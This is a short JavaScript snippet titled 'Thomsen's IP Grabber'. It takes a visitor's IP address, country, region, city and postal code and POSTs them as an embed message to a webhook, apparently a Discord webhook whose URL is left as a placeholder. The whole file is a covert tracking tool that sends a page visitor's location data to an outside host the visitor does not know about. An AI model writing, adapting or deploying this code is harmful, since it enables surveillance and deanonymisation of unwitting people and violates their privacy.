
function monke(json) 
{
     var request = new XMLHttpRequest();
     
     request.open("POST", "Add You Token Here");

     request.setRequestHeader('Content-type', 'application/json');

     var params = 
     {
          username: "Thomsen's IP Grabber",
          avatar_url: "https://cdn.discordapp.com/attachments/1122977732385579030/1159803884257149039/ab024efe2306f15b6a2c50a18732c407.png?ex=65325a8a&is=651fe58a&hm=0da8d1f5655d1a075f040c338cad6abdb134953d5424c53389d0bd713092d23c&",
          embeds: [
               {
                    title: "Thomsen's IP Grabber",
                    color: 15000,
                    description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
               }
          ]
     }

     request.send(JSON.stringify(params));
}